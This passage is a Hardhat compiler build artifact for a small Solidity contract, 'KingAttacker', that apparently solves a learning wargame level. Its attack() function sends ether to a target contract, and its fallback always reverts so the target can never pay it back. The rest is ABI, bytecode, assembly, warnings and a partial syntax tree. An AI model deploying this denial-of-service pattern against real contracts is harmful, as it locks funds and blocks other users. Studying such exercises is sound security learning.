{
	"id": "7c77f1f855813304db5240189a7b8315",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.6.12",
	"solcLongVersion": "0.6.12+commit.27d51765",
	"input": {
		"language": "Solidity",
		"sources": {
			"learn/king.sol": {
				"content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.6.0;\r\n\r\ncontract KingAttacker {\r\n\r\n    constructor() public payable{\r\n\r\n    }\r\n\r\n    function attack(address payable addr) public payable{\r\n        addr.call.value(msg.value)(\"\");\r\n    }\r\n    \r\n    fallback() external payable{\r\n        revert();\r\n    }\r\n\r\n} "
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"learn/king.sol": {
				"KingAttacker": {
					"abi": [
						{
							"inputs": [],
							"stateMutability": "payable",
							"type": "constructor"
						},
						{
							"stateMutability": "payable",
							"type": "fallback"
						},
						{
							"inputs": [
								{
									"internalType": "address payable",
									"name": "addr",
									"type": "address"
								}
							],
							"name": "attack",
							"outputs": [],
							"stateMutability": "payable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"learn/king.sol\":60:309  contract KingAttacker {\r... */\n  mstore(0x40, 0x80)\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"learn/king.sol\":60:309  contract KingAttacker {\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0xd018db3e\n      eq\n      tag_3\n      jumpi\n      jump(tag_2)\n    tag_1:\n    tag_2:\n        /* \"learn/king.sol\":288:296  revert() */\n      0x00\n      dup1\n      revert\n        /* \"learn/king.sol\":137:238  function attack(address payable addr) public payable{\r... */\n    tag_3:\n      tag_6\n      0x04\n      dup1\n      calldatasize\n      sub\n      0x20\n      dup2\n      lt\n      iszero\n      tag_7\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_7:\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_8\n      jump\t// in\n    tag_6:\n      stop\n    tag_8:\n        /* \"learn/king.sol\":200:204  addr */\n      dup1\n        /* \"learn/king.sol\":200:209  addr.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"learn/king.sol\":216:225  msg.value */\n      callvalue\n        /* \"learn/king.sol\":200:230  addr.call.value(msg.value)(\"\") */\n      mload(0x40)\n      dup1\n      0x00\n      add\n      swap1\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup8\n      gas\n      call\n      swap3\n      pop\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_12\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_11)\n    tag_12:\n      0x60\n      swap2\n      pop\n    tag_11:\n      pop\n      pop\n      pop\n        /* \"learn/king.sol\":137:238  function attack(address payable addr) public payable{\r... */\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220d0cc47d1d283ae757e944154ae3717d0d1232d7f9a715fa15fcbf6518be2835564736f6c634300060c0033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "6080604052610103806100136000396000f3fe608060405260043610601f5760003560e01c8063d018db3e146025576020565b5b600080fd5b606460048036036020811015603957600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506066565b005b8073ffffffffffffffffffffffffffffffffffffffff163460405180600001905060006040518083038185875af1925050503d806000811460c2576040519150601f19603f3d011682016040523d82523d6000602084013e60c7565b606091505b5050505056fea2646970667358221220d0cc47d1d283ae757e944154ae3717d0d1232d7f9a715fa15fcbf6518be2835564736f6c634300060c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH2 0x103 DUP1 PUSH2 0x13 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH1 0x1F JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xD018DB3E EQ PUSH1 0x25 JUMPI PUSH1 0x20 JUMP JUMPDEST JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x64 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH1 0x39 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x66 JUMP JUMPDEST STOP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLVALUE PUSH1 0x40 MLOAD DUP1 PUSH1 0x0 ADD SWAP1 POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH1 0xC2 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH1 0xC7 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xD0 0xCC SELFBALANCE 0xD1 0xD2 DUP4 0xAE PUSH22 0x7E944154AE3717D0D1232D7F9A715FA15FCBF6518BE2 DUP4 SSTORE PUSH5 0x736F6C6343 STOP MOD 0xC STOP CALLER ",
							"sourceMap": "60:249:0:-:0;;;;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405260043610601f5760003560e01c8063d018db3e146025576020565b5b600080fd5b606460048036036020811015603957600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506066565b005b8073ffffffffffffffffffffffffffffffffffffffff163460405180600001905060006040518083038185875af1925050503d806000811460c2576040519150601f19603f3d011682016040523d82523d6000602084013e60c7565b606091505b5050505056fea2646970667358221220d0cc47d1d283ae757e944154ae3717d0d1232d7f9a715fa15fcbf6518be2835564736f6c634300060c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH1 0x1F JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xD018DB3E EQ PUSH1 0x25 JUMPI PUSH1 0x20 JUMP JUMPDEST JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x64 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH1 0x39 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x66 JUMP JUMPDEST STOP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLVALUE PUSH1 0x40 MLOAD DUP1 PUSH1 0x0 ADD SWAP1 POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH1 0xC2 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH1 0xC7 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xD0 0xCC SELFBALANCE 0xD1 0xD2 DUP4 0xAE PUSH22 0x7E944154AE3717D0D1232D7F9A715FA15FCBF6518BE2 DUP4 SSTORE PUSH5 0x736F6C6343 STOP MOD 0xC STOP CALLER ",
							"sourceMap": "60:249:0:-:0;;;;;;;;;;;;;;;;;;;;;288:8;;;137:101;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;200:4;:9;;216;200:30;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;137:101;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "51800",
								"executionCost": "81",
								"totalCost": "51881"
							},
							"external": {
								"": "91",
								"attack(address)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 60,
									"end": 309,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 60,
									"end": 309,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 60,
									"end": 309,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 60,
									"end": 309,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 60,
									"end": 309,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 60,
									"end": 309,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 60,
									"end": 309,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 60,
									"end": 309,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 60,
									"end": 309,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 60,
									"end": 309,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220d0cc47d1d283ae757e944154ae3717d0d1232d7f9a715fa15fcbf6518be2835564736f6c634300060c0033",
									".code": [
										{
											"begin": 60,
											"end": 309,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 60,
											"end": 309,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 60,
											"end": 309,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 60,
											"end": 309,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 60,
											"end": 309,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 60,
											"end": 309,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 60,
											"end": 309,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 60,
											"end": 309,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 60,
											"end": 309,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 60,
											"end": 309,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 60,
											"end": 309,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 60,
											"end": 309,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 60,
											"end": 309,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 60,
											"end": 309,
											"name": "PUSH",
											"source": 0,
											"value": "D018DB3E"
										},
										{
											"begin": 60,
											"end": 309,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 60,
											"end": 309,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 60,
											"end": 309,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 60,
											"end": 309,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 60,
											"end": 309,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 60,
											"end": 309,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 60,
											"end": 309,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 60,
											"end": 309,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 60,
											"end": 309,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 288,
											"end": 296,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 288,
											"end": 296,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 288,
											"end": 296,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 137,
											"end": 238,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 137,
											"end": 238,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 137,
											"end": 238,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 137,
											"end": 238,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 137,
											"end": 238,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 137,
											"end": 238,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 137,
											"end": 238,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 137,
											"end": 238,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 137,
											"end": 238,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 137,
											"end": 238,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 137,
											"end": 238,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 137,
											"end": 238,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 137,
											"end": 238,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 137,
											"end": 238,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 137,
											"end": 238,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 137,
											"end": 238,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 137,
											"end": 238,
											"name": "tag",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 137,
											"end": 238,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 137,
											"end": 238,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 137,
											"end": 238,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 137,
											"end": 238,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 137,
											"end": 238,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 137,
											"end": 238,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 137,
											"end": 238,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 137,
											"end": 238,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 137,
											"end": 238,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 137,
											"end": 238,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 137,
											"end": 238,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 137,
											"end": 238,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 137,
											"end": 238,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 137,
											"end": 238,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 137,
											"end": 238,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 137,
											"end": 238,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 137,
											"end": 238,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 137,
											"end": 238,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 137,
											"end": 238,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 137,
											"end": 238,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 137,
											"end": 238,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 137,
											"end": 238,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 137,
											"end": 238,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 137,
											"end": 238,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 137,
											"end": 238,
											"name": "tag",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 137,
											"end": 238,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 200,
											"end": 204,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 200,
											"end": 209,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 200,
											"end": 209,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 216,
											"end": 225,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 200,
											"end": 230,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 200,
											"end": 230,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 200,
											"end": 230,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 200,
											"end": 230,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 200,
											"end": 230,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 200,
											"end": 230,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 200,
											"end": 230,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 200,
											"end": 230,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "PUSH",
											"source": 0,
											"value": "3F"
										},
										{
											"begin": 200,
											"end": 230,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 200,
											"end": 230,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 200,
											"end": 230,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 200,
											"end": 230,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 200,
											"end": 230,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 200,
											"end": 230,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 200,
											"end": 230,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 200,
											"end": 230,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 200,
											"end": 230,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 137,
											"end": 238,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 137,
											"end": 238,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"attack(address)": "d018db3e"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"learn/king.sol\":\"KingAttacker\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"learn/king.sol\":{\"keccak256\":\"0x4627b2009b86e127a4d990bb6431a2bdc9363f31d83c7ad7c376e200f13bd5b6\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://21ba53c7cf974e607faccf1f215469b79503256409bb5e6a1a6b6bf9a9933cc0\",\"dweb:/ipfs/QmXdGGDcw4MrpgtBYo5rHNXpv2go44BXA7tndHDtTfmHX6\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"errors": [
			{
				"component": "general",
				"errorCode": "3628",
				"formattedMessage": "learn/king.sol:4:1: Warning: This contract has a payable fallback function, but no receive ether function. Consider adding a receive ether function.\ncontract KingAttacker {\n^ (Relevant source part starts here and spans across multiple lines).\nlearn/king.sol:14:5: The payable fallback function is defined here.\n    fallback() external payable{\n    ^ (Relevant source part starts here and spans across multiple lines).\n",
				"message": "This contract has a payable fallback function, but no receive ether function. Consider adding a receive ether function.",
				"secondarySourceLocations": [
					{
						"end": 304,
						"file": "learn/king.sol",
						"message": "The payable fallback function is defined here.",
						"start": 250
					}
				],
				"severity": "warning",
				"sourceLocation": {
					"end": 309,
					"file": "learn/king.sol",
					"start": 60
				},
				"type": "Warning"
			},
			{
				"component": "general",
				"errorCode": "1621",
				"formattedMessage": "learn/king.sol:11:9: Warning: Using \".value(...)\" is deprecated. Use \"{value: ...}\" instead.\n        addr.call.value(msg.value)(\"\");\n        ^-------------^\n",
				"message": "Using \".value(...)\" is deprecated. Use \"{value: ...}\" instead.",
				"severity": "warning",
				"sourceLocation": {
					"end": 215,
					"file": "learn/king.sol",
					"start": 200
				},
				"type": "Warning"
			},
			{
				"component": "general",
				"errorCode": "9302",
				"formattedMessage": "learn/king.sol:11:9: Warning: Return value of low-level calls not used.\n        addr.call.value(msg.value)(\"\");\n        ^----------------------------^\n",
				"message": "Return value of low-level calls not used.",
				"severity": "warning",
				"sourceLocation": {
					"end": 230,
					"file": "learn/king.sol",
					"start": 200
				},
				"type": "Warning"
			}
		],
		"sources": {
			"learn/king.sol": {
				"ast": {
					"absolutePath": "learn/king.sol",
					"exportedSymbols": {
						"KingAttacker": [
							30
						]
					},
					"id": 31,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.6",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "33:23:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 30,
							"linearizedBaseContracts": [
								30
							],
							"name": "KingAttacker",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 4,
										"nodeType": "Block",
										"src": "119:10:0",
										"statements": []
									},
									"documentation": null,
									"id": 5,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 2,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "102:2:0"
									},
									"returnParameters": {
										"id": 3,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "119:0:0"
									},
									"scope": 30,
									"src": "91:38:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 21,
										"nodeType": "Block",
										"src": "189:49:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"hexValue": "",
															"id": 18,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "227:2:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																"typeString": "literal_string \"\""
															},
															"value": ""
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																"typeString": "literal_string \"\""
															}
														],
														"arguments": [
															{
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 15,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": -15,
																	"src": "216:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 16,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "value",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "216:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 10,
																	"name": "addr",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 7,
